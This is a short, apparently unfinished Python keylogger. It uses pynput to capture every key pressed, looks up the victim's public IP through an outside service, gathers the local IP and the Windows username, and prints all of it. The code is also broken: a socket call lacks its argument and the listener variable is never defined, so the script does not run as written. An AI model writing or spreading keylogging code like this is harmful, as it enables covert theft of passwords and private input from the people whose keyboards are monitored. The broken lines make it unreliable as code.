from pynput.keyboard import Key, Listener
import time
import os
import random
import requests
import socket

publicIP = requests.get("https://api.ipify.org").text
privateIP = socket.gethostbyname(socket.gethostbyname())
user = os.path.expanduser("~").split("\\")[2]
datetime = time.ctime(time.time())

print(privateIP)
print(user)

def on_press(key):
    print(key)

with Listener(on_press=on_press):
    listener.join()